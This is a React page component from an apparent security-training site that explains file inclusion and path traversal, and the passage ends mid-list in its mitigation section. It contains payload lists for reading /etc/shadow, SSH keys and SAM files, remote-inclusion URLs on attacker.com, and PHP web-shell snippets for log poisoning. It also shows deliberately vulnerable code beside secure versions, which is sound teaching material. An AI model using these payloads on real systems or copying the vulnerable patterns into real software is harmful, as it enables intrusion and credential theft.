
import React from 'react';
import { FolderOpen, AlertTriangle, InfoIcon, Shield } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';

const FileInclusionPathTraversal: React.FC = () => {
  return (
    <section id="file-inclusion" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">File Inclusion & Path Traversal</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            File inclusion and path traversal vulnerabilities allow attackers to access files on the server 
            that should not be accessible through the web application. These vulnerabilities occur when 
            applications use user-supplied input to determine which files to include, read, or execute 
            without proper validation. Attackers can exploit these flaws to read sensitive files, 
            execute arbitrary code, or gain unauthorized access to system resources.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker's Goal</AlertTitle>
            <AlertDescription>
              Access sensitive files, configuration data, source code, or system files that are outside 
              the intended web root directory. In severe cases, achieve remote code execution by including 
              malicious files or leveraging file upload vulnerabilities in combination with file inclusion.
            </AlertDescription>
          </Alert>
        </div>

        {/* Attack Types */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Types of File Inclusion Attacks</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <SecurityCard 
              title="Local File Inclusion (LFI)" 
              description="Includes files from the local server filesystem, allowing access to configuration files, logs, and source code." 
              severity="high" 
            />
            <SecurityCard 
              title="Remote File Inclusion (RFI)" 
              description="Includes files from remote servers, enabling attackers to execute arbitrary code by hosting malicious files externally." 
              severity="high" 
            />
            <SecurityCard 
              title="Path Traversal" 
              description="Uses directory traversal sequences (../) to access files outside the intended directory structure." 
              severity="medium" 
            />
            <SecurityCard 
              title="Null Byte Injection" 
              description="Uses null bytes to truncate file paths and bypass file extension filters in vulnerable applications." 
              severity="medium" 
            />
          </div>
        </div>

        {/* Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <ul className="list-disc pl-6 space-y-2">
              <li><strong>Template Engines:</strong> PHP include/require, JSP include directives, ASP.NET user controls</li>
              <li><strong>File Download Handlers:</strong> PDF generators, image processors, document viewers</li>
              <li><strong>Content Management Systems:</strong> WordPress, Drupal plugins with dynamic file loading</li>
              <li><strong>Language Modules:</strong> PHP, JSP, ASP.NET applications with dynamic includes</li>
              <li><strong>API Endpoints:</strong> File serving APIs, documentation viewers, help systems</li>
              <li><strong>Log Viewers:</strong> Administrative interfaces for viewing log files</li>
              <li><strong>Configuration Interfaces:</strong> Systems that load configuration files dynamically</li>
              <li><strong>Multi-language Applications:</strong> Systems loading language files based on user input</li>
            </ul>
          </div>
        </div>

        {/* Why These Attacks Work */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Why File Inclusion Attacks Work</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Common Vulnerabilities</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Direct use of user input in file path construction</li>
                <li>Insufficient input validation and sanitization</li>
                <li>Lack of proper path canonicalization</li>
                <li>Missing file extension restrictions</li>
                <li>Inadequate access controls on file system resources</li>
                <li>Poor understanding of file system security implications</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Implementation Issues</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Blacklist-based filtering instead of whitelisting</li>
                <li>Insufficient path traversal sequence detection</li>
                <li>Improper handling of URL encoding and special characters</li>
                <li>Missing chroot or sandbox implementations</li>
                <li>Inadequate error handling revealing file system information</li>
                <li>Lack of proper file type verification</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Step-by-Step Attack Methodology */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step Attack Methodology</h4>
          <Tabs defaultValue="discovery">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="discovery">Discovery</TabsTrigger>
              <TabsTrigger value="testing">Testing</TabsTrigger>
              <TabsTrigger value="exploitation">Exploitation</TabsTrigger>
              <TabsTrigger value="escalation">Escalation</TabsTrigger>
            </TabsList>
            
            <TabsContent value="discovery" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 1: File Inclusion Discovery</h5>
                <ol className="list-decimal pl-6 space-y-2">
                  <li><strong>Parameter Analysis:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Look for parameters that reference files: file, page, include, template</li>
                      <li>Check URL parameters, POST data, and HTTP headers</li>
                      <li>Analyze JavaScript and form submissions for file references</li>
                      <li>Examine cookie values and session data for file paths</li>
                    </ul>
                  </li>
                  <li><strong>Functionality Mapping:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Identify file download and viewing features</li>
                      <li>Test template loading and language switching</li>
                      <li>Check document viewers and help systems</li>
                      <li>Analyze administrative interfaces and log viewers</li>
                    </ul>
                  </li>
                </ol>
              </div>
            </TabsContent>
            
            <TabsContent value="testing" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 2: Vulnerability Testing</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Testing Techniques:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Path Traversal Testing:</strong> Try ../, ..\\, and encoded variations</li>
                    <li><strong>Absolute Path Testing:</strong> Test direct file paths like /etc/passwd</li>
                    <li><strong>Null Byte Injection:</strong> Use %00 to truncate file extensions</li>
                    <li><strong>Remote File Testing:</strong> Attempt to include files from external sources</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="exploitation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 3: File Access Exploitation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Exploitation Steps:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Sensitive File Access:</strong> Read configuration files, databases, source code</li>
                    <li><strong>System Reconnaissance:</strong> Gather information about the server environment</li>
                    <li><strong>Code Execution:</strong> Include malicious files for remote code execution</li>
                    <li><strong>Log Poisoning:</strong> Manipulate log files to inject executable code</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="escalation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 4: Advanced Exploitation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Advanced Techniques:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Remote Shell Access:</strong> Upload and execute shell scripts</li>
                    <li><strong>Privilege Escalation:</strong> Use file access to gain higher privileges</li>
                    <li><strong>Data Exfiltration:</strong> Access and steal sensitive information</li>
                    <li><strong>Persistence:</strong> Plant backdoors in accessible directories</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Common Payloads */}
        <div>
          <h4 className="text-xl font-semibold mb-4">File Inclusion Attack Payloads</h4>
          
          <CodeExample 
            language="bash" 
            isVulnerable={true}
            title="Path Traversal Payloads" 
            code={`# Basic path traversal
../../../etc/passwd
..\\..\\..\\windows\\system32\\drivers\\etc\\hosts

# URL encoded path traversal
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts

# Double encoding
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode encoding
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd

# Null byte injection (for older PHP versions)
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# Absolute paths
/etc/passwd
/var/log/apache2/access.log
/proc/self/environ
/etc/shadow
C:\\windows\\system32\\drivers\\etc\\hosts
C:\\windows\\system32\\config\\sam

# Common sensitive files on Linux
/etc/passwd          # User accounts
/etc/shadow          # Password hashes
/etc/group           # Group information
/etc/hosts           # Host file
/etc/motd            # Message of the day
/etc/issue           # Login banner
/proc/version        # Kernel version
/proc/cmdline        # Boot parameters
/proc/self/environ   # Environment variables
/var/log/apache2/access.log  # Web server logs
/var/log/auth.log    # Authentication logs
/home/user/.ssh/id_rsa  # SSH private keys

# Common sensitive files on Windows
C:\\windows\\system32\\drivers\\etc\\hosts
C:\\windows\\system32\\config\\sam
C:\\windows\\repair\\sam
C:\\windows\\panther\\unattend.xml
C:\\inetpub\\logs\\LogFiles\\W3SVC1\\
C:\\inetpub\\wwwroot\\web.config

# Application-specific files
config/database.yml  # Rails database config
wp-config.php        # WordPress configuration
.env                 # Environment variables
config.php           # PHP configuration
web.config           # ASP.NET configuration
application.properties  # Spring Boot config`} 
          />

          <CodeExample 
            language="bash" 
            isVulnerable={true}
            title="Remote File Inclusion Payloads" 
            code={`# Basic remote file inclusion
http://attacker.com/malicious.txt
https://attacker.com/shell.php
ftp://attacker.com/backdoor.txt

# Using data URIs
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Using PHP wrappers
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=config.php
php://input

# Using file wrappers
file:///etc/passwd
file://C:\\windows\\system32\\drivers\\etc\\hosts

# Log poisoning payloads (inject into User-Agent)
<?php system($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>

# Zip wrapper exploitation
zip://path/to/file.zip%23shell.php

# Expect wrapper (if enabled)
expect://id

# SSH2 wrapper (if enabled)
ssh2.shell://user:pass@example.com:22/bin/bash`} 
          />
        </div>

        {/* Vulnerable Code Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Vulnerable Code Examples</h4>
          
          <CodeExample 
            language="php" 
            isVulnerable={true}
            title="Vulnerable PHP File Inclusion" 
            code={`<?php
// VULNERABLE: Direct file inclusion without validation
$page = $_GET['page'];
include($page . '.php');

// Attacker payload: ?page=../../../etc/passwd%00
// Result: include('../../../etc/passwd.php') - but %00 truncates

// VULNERABLE: File download without path validation
function downloadFile($filename) {
    $filepath = '/var/www/uploads/' . $filename;
    
    if (file_exists($filepath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        readfile($filepath);
    } else {
        echo "File not found";
    }
}

// Usage: downloadFile($_GET['file']);
// Attacker payload: ?file=../../../etc/passwd
// Result: Downloads /var/www/uploads/../../../etc/passwd

// VULNERABLE: Template inclusion
function loadTemplate($template) {
    $templatePath = 'templates/' . $template . '.tpl';
    return file_get_contents($templatePath);
}

// Attacker payload: ?template=../config/database
// Result: Loads templates/../config/database.tpl

// VULNERABLE: Log viewer
function viewLog($logfile) {
    $logPath = '/var/log/app/' . $logfile;
    echo "<pre>" . htmlspecialchars(file_get_contents($logPath)) . "</pre>";
}

// Attacker payload: ?logfile=../../../etc/passwd
// Result: Displays /var/log/app/../../../etc/passwd

// VULNERABLE: Language file loading
function loadLanguage($lang) {
    include('lang/' . $lang . '.php');
}

// Attacker payload: ?lang=http://attacker.com/shell
// Result: include('lang/http://attacker.com/shell.php')

// VULNERABLE: Image processing
function resizeImage($image) {
    $imagePath = 'images/' . $image;
    
    // Process image without validation
    $imageData = file_get_contents($imagePath);
    return $imageData;
}

// Attacker payload: ?image=../config/database.php
?>`} 
          />

          <CodeExample 
            language="python" 
            isVulnerable={true}
            title="Vulnerable Python File Handling" 
            code={`import os
from flask import Flask, request, send_file, render_template

app = Flask(__name__)

# VULNERABLE: File download without validation
@app.route('/download')
def download_file():
    filename = request.args.get('filename')
    
    # VULNERABLE: Direct path construction
    file_path = os.path.join('uploads', filename)
    
    try:
        return send_file(file_path)
    except FileNotFoundError:
        return "File not found", 404

# Attacker payload: ?filename=../../../etc/passwd
# Result: Serves uploads/../../../etc/passwd

# VULNERABLE: Template rendering with user input
@app.route('/page')
def render_page():
    page = request.args.get('page', 'home')
    
    # VULNERABLE: User controls template name
    template_name = f"pages/{page}.html"
    
    try:
        return render_template(template_name)
    except:
        return "Page not found", 404

# Attacker payload: ?page=../../../etc/passwd
# Result: Attempts to render pages/../../../etc/passwd.html

# VULNERABLE: Log file viewer
@app.route('/logs')
def view_logs():
    log_file = request.args.get('file', 'app.log')
    log_path = f'/var/log/app/{log_file}'
    
    try:
        with open(log_path, 'r') as f:
            content = f.read()
        return f"<pre>{content}</pre>"
    except:
        return "Log file not found", 404

# Attacker payload: ?file=../../../etc/passwd
# Result: Reads /var/log/app/../../../etc/passwd

# VULNERABLE: File upload and processing
@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    filename = file.filename
    
    # VULNERABLE: No path validation
    save_path = os.path.join('uploads', filename)
    file.save(save_path)
    
    return f"File saved to {save_path}"

# Attacker can upload to: ../../../var/www/html/shell.php

# VULNERABLE: Configuration file loading
def load_config(config_name):
    config_path = f'config/{config_name}.json'
    
    with open(config_path, 'r') as f:
        return json.load(f)

# Attacker payload: load_config('../../../etc/passwd')
# Result: Attempts to load config/../../../etc/passwd.json`} 
          />

          <CodeExample 
            language="javascript" 
            isVulnerable={true}
            title="Vulnerable Node.js File Handling" 
            code={`const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();

// VULNERABLE: File serving without validation
app.get('/file/:filename', (req, res) => {
    const filename = req.params.filename;
    
    // VULNERABLE: Direct path construction
    const filePath = path.join(__dirname, 'public', filename);
    
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.status(404).send('File not found');
        } else {
            res.send(data);
        }
    });
});

// Attacker payload: /file/../../../etc/passwd
// Result: Serves public/../../../etc/passwd

// VULNERABLE: Template rendering
app.get('/page', (req, res) => {
    const page = req.query.page || 'home';
    
    // VULNERABLE: User controls template path
    const templatePath = \`views/\${page}.ejs\`;
    
    res.render(templatePath, (err, html) => {
        if (err) {
            res.status(404).send('Page not found');
        } else {
            res.send(html);
        }
    });
});

// Attacker payload: ?page=../../../etc/passwd
// Result: Attempts to render views/../../../etc/passwd.ejs

// VULNERABLE: File download
app.get('/download', (req, res) => {
    const filename = req.query.file;
    const downloadPath = \`downloads/\${filename}\`;
    
    // VULNERABLE: No path validation
    res.download(downloadPath, (err) => {
        if (err) {
            res.status(404).send('Download failed');
        }
    });
});

// VULNERABLE: Log viewer
app.get('/logs', (req, res) => {
    const logFile = req.query.log || 'app.log';
    const logPath = \`/var/log/\${logFile}\`;
    
    fs.readFile(logPath, 'utf8', (err, data) => {
        if (err) {
            res.status(404).send('Log not found');
        } else {
            res.send(\`<pre>\${data}</pre>\`);
        }
    });
});

// Attacker payload: ?log=../../../etc/passwd
// Result: Reads /var/log/../../../etc/passwd

// VULNERABLE: Configuration loading
function loadConfig(configName) {
    const configPath = \`config/\${configName}.json\`;
    
    try {
        const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
        return config;
    } catch (err) {
        throw new Error('Config not found');
    }
}

// Attacker payload: loadConfig('../../../etc/passwd')
// Result: Attempts to load config/../../../etc/passwd.json`} 
          />
        </div>

        {/* Secure Code Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Secure Code Examples</h4>
          
          <CodeExample 
            language="php" 
            isVulnerable={false}
            title="Secure PHP File Handling" 
            code={`<?php
// SECURE: File inclusion with whitelist validation
function includePageSecure($page) {
    // 1. Whitelist allowed pages
    $allowedPages = ['home', 'about', 'contact', 'products'];
    
    if (!in_array($page, $allowedPages)) {
        throw new InvalidArgumentException("Invalid page requested");
    }
    
    // 2. Use fixed path structure
    $pagePath = "pages/" . $page . ".php";
    
    // 3. Verify file exists within expected location
    $realPath = realpath($pagePath);
    $expectedPath = realpath("pages/") . DIRECTORY_SEPARATOR;
    
    if ($realPath === false || strpos($realPath, $expectedPath) !== 0) {
        throw new SecurityException("Unauthorized file access");
    }
    
    include($realPath);
}

// SECURE: File download with validation
function downloadFileSecure($filename) {
    // 1. Validate filename format
    if (!preg_match('/^[a-zA-Z0-9_.-]+$/', $filename)) {
        throw new InvalidArgumentException("Invalid filename format");
    }
    
    // 2. Sanitize filename
    $filename = basename($filename);
    
    // 3. Construct safe path
    $uploadDir = realpath('/var/www/uploads/');
    $filepath = $uploadDir . DIRECTORY_SEPARATOR . $filename;
    
    // 4. Verify path is within allowed directory
    $realFilePath = realpath($filepath);
    if ($realFilePath === false || strpos($realFilePath, $uploadDir) !== 0) {
        throw new SecurityException("Unauthorized file access");
    }
    
    // 5. Additional security checks
    if (!is_file($realFilePath) || !is_readable($realFilePath)) {
        throw new Exception("File not accessible");
    }
    
    // 6. Serve file safely
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $filename . '"');
    readfile($realFilePath);
}

// SECURE: Template loading with validation
function loadTemplateSecure($template) {
    // 1. Whitelist allowed templates
    $allowedTemplates = ['header', 'footer', 'sidebar', 'content'];
    
    if (!in_array($template, $allowedTemplates)) {
        throw new InvalidArgumentException("Invalid template");
    }
    
    // 2. Use secure path construction
    $templateDir = realpath('templates/');
    $templatePath = $templateDir . DIRECTORY_SEPARATOR . $template . '.tpl';
    
    // 3. Verify path security
    $realPath = realpath($templatePath);
    if ($realPath === false || strpos($realPath, $templateDir) !== 0) {
        throw new SecurityException("Unauthorized template access");
    }
    
    return file_get_contents($realPath);
}

// SECURE: Log viewer with restrictions
function viewLogSecure($logfile) {
    // 1. Whitelist allowed log files
    $allowedLogs = ['app.log', 'error.log', 'access.log'];
    
    if (!in_array($logfile, $allowedLogs)) {
        throw new InvalidArgumentException("Unauthorized log file");
    }
    
    // 2. Construct secure path
    $logDir = realpath('/var/log/app/');
    $logPath = $logDir . DIRECTORY_SEPARATOR . $logfile;
    
    // 3. Verify file exists and is readable
    if (!is_file($logPath) || !is_readable($logPath)) {
        throw new Exception("Log file not accessible");
    }
    
    // 4. Return limited content (last 1000 lines)
    $lines = file($logPath);
    return implode('', array_slice($lines, -1000));
}

// SECURE: Image processing with validation
function processImageSecure($image) {
    // 1. Validate image name
    if (!preg_match('/^[a-zA-Z0-9_.-]+\\.(jpg|jpeg|png|gif)$/i', $image)) {
        throw new InvalidArgumentException("Invalid image filename");
    }
    
    // 2. Use basename to prevent directory traversal
    $imageName = basename($image);
    
    // 3. Construct secure path
    $imageDir = realpath('images/');
    $imagePath = $imageDir . DIRECTORY_SEPARATOR . $imageName;
    
    // 4. Verify path and file type
    $realPath = realpath($imagePath);
    if ($realPath === false || strpos($realPath, $imageDir) !== 0) {
        throw new SecurityException("Unauthorized image access");
    }
    
    // 5. Verify file is actually an image
    $imageInfo = getimagesize($realPath);
    if ($imageInfo === false) {
        throw new InvalidArgumentException("Invalid image file");
    }
    
    return file_get_contents($realPath);
}
?>`} 
          />

          <CodeExample 
            language="python" 
            isVulnerable={false}
            title="Secure Python File Handling" 
            code={`import os
import re
from pathlib import Path
from flask import Flask, request, send_file, render_template, abort
from werkzeug.utils import secure_filename

app = Flask(__name__)

# SECURE: File download with validation
@app.route('/download')
def download_file_secure():
    filename = request.args.get('filename')
    
    if not filename:
        abort(400, "Filename required")
    
    # 1. Validate filename format
    if not re.match(r'^[a-zA-Z0-9_.-]+$', filename):
        abort(400, "Invalid filename format")
    
    # 2. Use secure_filename for additional sanitization
    filename = secure_filename(filename)
    
    # 3. Define safe directory
    upload_dir = Path('/var/www/uploads').resolve()
    file_path = upload_dir / filename
    
    # 4. Verify path is within allowed directory
    try:
        file_path = file_path.resolve()
        file_path.relative_to(upload_dir)
    except (OSError, ValueError):
        abort(403, "Unauthorized file access")
    
    # 5. Check file exists and is readable
    if not file_path.exists() or not file_path.is_file():
        abort(404, "File not found")
    
    return send_file(str(file_path), as_attachment=True)

# SECURE: Template rendering with whitelist
@app.route('/page')
def render_page_secure():
    page = request.args.get('page', 'home')
    
    # 1. Whitelist allowed pages
    allowed_pages = ['home', 'about', 'contact', 'products']
    
    if page not in allowed_pages:
        abort(400, "Invalid page")
    
    # 2. Use secure template path
    template_name = f"pages/{page}.html"
    
    try:
        return render_template(template_name)
    except TemplateNotFound:
        abort(404, "Page not found")

# SECURE: Log file viewer with restrictions
@app.route('/logs')
def view_logs_secure():
    log_file = request.args.get('file', 'app.log')
    
    # 1. Whitelist allowed log files
    allowed_logs = ['app.log', 'error.log', 'access.log']
    
    if log_file not in allowed_logs:
        abort(400, "Unauthorized log file")
    
    # 2. Construct secure path
    log_dir = Path('/var/log/app').resolve()
    log_path = log_dir / log_file
    
    # 3. Verify path security
    try:
        log_path = log_path.resolve()
        log_path.relative_to(log_dir)
    except (OSError, ValueError):
        abort(403, "Unauthorized access")
    
    # 4. Read file safely
    try:
        with open(log_path, 'r') as f:
            # Limit content size
            content = f.read(100000)  # Max 100KB
        return f"<pre>{content}</pre>"
    except IOError:
        abort(404, "Log file not accessible")

# SECURE: File upload with validation
@app.route('/upload', methods=['POST'])
def upload_file_secure():
    if 'file' not in request.files:
        abort(400, "No file provided")
    
    file = request.files['file']
    
    if file.filename == '':
        abort(400, "No file selected")
    
    # 1. Validate file extension
    allowed_extensions = {'.txt', '.pdf', '.jpg', '.png', '.doc', '.docx'}
    filename = secure_filename(file.filename)
    file_ext = Path(filename).suffix.lower()
    
    if file_ext not in allowed_extensions:
        abort(400, "File type not allowed")
    
    # 2. Generate safe filename
    import uuid
    safe_filename = str(uuid.uuid4()) + file_ext
    
    # 3. Define upload directory
    upload_dir = Path('/var/www/uploads').resolve()
    save_path = upload_dir / safe_filename
    
    # 4. Ensure directory exists
    upload_dir.mkdir(exist_ok=True)
    
    # 5. Save file
    file.save(str(save_path))
    
    return f"File uploaded successfully as {safe_filename}"

# SECURE: Configuration loading with validation
def load_config_secure(config_name):
    # 1. Whitelist allowed configurations
    allowed_configs = ['app', 'database', 'cache', 'email']
    
    if config_name not in allowed_configs:
        raise ValueError("Invalid configuration name")
    
    # 2. Construct secure path
    config_dir = Path('config').resolve()
    config_path = config_dir / f"{config_name}.json"
    
    # 3. Verify path security
    try:
        config_path = config_path.resolve()
        config_path.relative_to(config_dir)
    except (OSError, ValueError):
        raise SecurityError("Unauthorized config access")
    
    # 4. Load configuration
    try:
        with open(config_path, 'r') as f:
            import json
            return json.load(f)
    except (IOError, json.JSONDecodeError):
        raise ConfigurationError("Failed to load configuration")

class SecurityError(Exception):
    pass

class ConfigurationError(Exception):
    pass`} 
          />

          <CodeExample 
            language="javascript" 
            isVulnerable={false}
            title="Secure Node.js File Handling" 
            code={`const express = require('express');
const fs = require('fs').promises;
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();

// SECURE: File serving with validation
app.get('/file/:filename', async (req, res) => {
    const filename = req.params.filename;
    
    // 1. Validate filename format
    if (!/^[a-zA-Z0-9_.-]+$/.test(filename)) {
        return res.status(400).send('Invalid filename format');
    }
    
    // 2. Use path.basename to prevent directory traversal
    const safeFilename = path.basename(filename);
    
    // 3. Define safe directory
    const publicDir = path.resolve(__dirname, 'public');
    const filePath = path.join(publicDir, safeFilename);
    
    // 4. Verify path is within allowed directory
    const resolvedPath = path.resolve(filePath);
    if (!resolvedPath.startsWith(publicDir)) {
        return res.status(403).send('Unauthorized file access');
    }
    
    try {
        // 5. Check file exists
        await fs.access(resolvedPath);
        const data = await fs.readFile(resolvedPath);
        res.send(data);
    } catch (err) {
        res.status(404).send('File not found');
    }
});

// SECURE: Template rendering with whitelist
app.get('/page', (req, res) => {
    const page = req.query.page || 'home';
    
    // 1. Whitelist allowed pages
    const allowedPages = ['home', 'about', 'contact', 'products'];
    
    if (!allowedPages.includes(page)) {
        return res.status(400).send('Invalid page');
    }
    
    // 2. Use secure template path
    const templatePath = \`views/\${page}.ejs\`;
    
    res.render(templatePath, (err, html) => {
        if (err) {
            res.status(404).send('Page not found');
        } else {
            res.send(html);
        }
    });
});

// SECURE: File download with validation
app.get('/download', async (req, res) => {
    const filename = req.query.file;
    
    if (!filename) {
        return res.status(400).send('Filename required');
    }
    
    // 1. Validate filename
    if (!/^[a-zA-Z0-9_.-]+$/.test(filename)) {
        return res.status(400).send('Invalid filename');
    }
    
    // 2. Use basename and construct safe path
    const safeFilename = path.basename(filename);
    const downloadDir = path.resolve(__dirname, 'downloads');
    const downloadPath = path.join(downloadDir, safeFilename);
    
    // 3. Verify path security
    const resolvedPath = path.resolve(downloadPath);
    if (!resolvedPath.startsWith(downloadDir)) {
        return res.status(403).send('Unauthorized access');
    }
    
    try {
        await fs.access(resolvedPath);
        res.download(resolvedPath);
    } catch (err) {
        res.status(404).send('File not found');
    }
});

// SECURE: Log viewer with restrictions
app.get('/logs', async (req, res) => {
    const logFile = req.query.log;
    
    // 1. Whitelist allowed log files
    const allowedLogs = ['app.log', 'error.log', 'access.log'];
    
    if (!allowedLogs.includes(logFile)) {
        return res.status(400).send('Unauthorized log file');
    }
    
    // 2. Construct secure path
    const logDir = path.resolve('/var/log');
    const logPath = path.join(logDir, logFile);
    
    try {
        // 3. Read file with size limit
        const stats = await fs.stat(logPath);
        if (stats.size > 1000000) { // 1MB limit
            return res.status(413).send('Log file too large');
        }
        
        const data = await fs.readFile(logPath, 'utf8');
        res.send(\`<pre>\${data}</pre>\`);
    } catch (err) {
        res.status(404).send('Log not found');
    }
});

// SECURE: File upload with validation
const multer = require('multer');

const storage = multer.diskStorage({
    destination: function(req, file, cb) {
        cb(null, path.resolve(__dirname, 'uploads'));
    },
    filename: function(req, file, cb) {
        // Generate safe filename
        const ext = path.extname(file.originalname);
        const safeName = uuidv4() + ext;
        cb(null, safeName);
    }
});

const fileFilter = (req, file, cb) => {
    // 1. Validate file extensions
    const allowedExtensions = ['.txt', '.pdf', '.jpg', '.png', '.doc', '.docx'];
    const ext = path.extname(file.originalname).toLowerCase();
    
    if (allowedExtensions.includes(ext)) {
        cb(null, true);
    } else {
        cb(new Error('File type not allowed'), false);
    }
};

const upload = multer({
    storage: storage,
    fileFilter: fileFilter,
    limits: {
        fileSize: 5 * 1024 * 1024 // 5MB limit
    }
});

app.post('/upload', upload.single('file'), (req, res) => {
    if (!req.file) {
        return res.status(400).send('No file uploaded');
    }
    
    res.json({
        message: 'File uploaded successfully',
        filename: req.file.filename
    });
});

// SECURE: Configuration loading with validation
async function loadConfigSecure(configName) {
    // 1. Whitelist allowed configurations
    const allowedConfigs = ['app', 'database', 'cache', 'email'];
    
    if (!allowedConfigs.includes(configName)) {
        throw new Error('Invalid configuration name');
    }
    
    // 2. Construct secure path
    const configDir = path.resolve(__dirname, 'config');
    const configPath = path.join(configDir, \`\${configName}.json\`);
    
    // 3. Verify path security
    const resolvedPath = path.resolve(configPath);
    if (!resolvedPath.startsWith(configDir)) {
        throw new Error('Unauthorized config access');
    }
    
    try {
        const data = await fs.readFile(resolvedPath, 'utf8');
        return JSON.parse(data);
    } catch (err) {
        throw new Error('Failed to load configuration');
    }
}

module.exports = { app, loadConfigSecure };`} 
          />
        </div>

        {/* Testing and Detection */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Testing for File Inclusion Vulnerabilities</h4>
          <div className="space-y-4">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Manual Testing Techniques</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Test path traversal sequences: ../, ..\\, %2e%2e%2f</li>
                <li>Try absolute paths: /etc/passwd, C:\\windows\\system32\\drivers\\etc\\hosts</li>
                <li>Test null byte injection: %00 (for older systems)</li>
                <li>Check for remote file inclusion with external URLs</li>
                <li>Test various encoding methods: URL, Unicode, double encoding</li>
                <li>Verify file extension bypasses and filter evasion</li>
                <li>Test different file wrappers and protocols</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Automated Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Burp Suite:</strong> LFI/RFI scanner and manual testing tools</li>
                <li><strong>OWASP ZAP:</strong> File inclusion vulnerability detection</li>
                <li><strong>Wfuzz:</strong> Fuzzing tool for testing file inclusion</li>
                <li><strong>DotDotPwn:</strong> Dedicated directory traversal fuzzer</li>
                <li><strong>LFISuite:</strong> Automated LFI exploitation tool</li>
                <li><strong>Gobuster:</strong> Directory and file discovery tool</li>
                <li><strong>Nikto:</strong> Web vulnerability scanner including file issues</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Prevention Strategies */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Prevention and Mitigation Strategies</h4>
          
          <Alert className="mb-6">
            <Shield className="h-4 w-4" />
            <AlertTitle>Defense in Depth</AlertTitle>
            <AlertDescription>
              Implement multiple layers of protection including input validation, path canonicalization, 
              access controls, and system-level restrictions to prevent file inclusion attacks.
            </AlertDescription>
          </Alert>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <div className="p-4 rounded-md border border-green-200 dark:border-green-800 bg-cybr-muted">
              <h5 className="font-semibold mb-3 text-green-800 dark:text-green-200">Input Validation</h5>
              <ul className="list-disc pl-6 space-y-2 text-sm">
                <li><strong>Whitelist Validation:</strong> Only allow known safe files and directories</li>
                <li><strong>Path Canonicalization:</strong> Resolve and validate absolute paths</li>
                <li><strong>Filename Sanitization:</strong> Use basename() and sanitize user input</li>
                <li><strong>Extension Validation:</strong> Restrict allowed file extensions</li>
